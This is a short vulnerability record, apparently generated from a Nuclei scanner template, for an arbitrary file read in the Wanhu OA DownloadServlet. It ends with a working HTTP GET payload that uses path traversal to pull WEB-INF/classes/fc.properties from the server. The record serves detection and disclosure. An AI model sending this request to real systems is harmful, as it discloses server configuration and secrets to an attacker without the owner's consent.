# Vulnerability: Wanhu OA DownloadServlet - Remote File Disclosure
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`wanhuoa-downloadservlet-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in the Wanhu OA DownloadServlet interface. An attacker can use the vulnerability to read sensitive files in the server and obtain sensitive information.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2
```

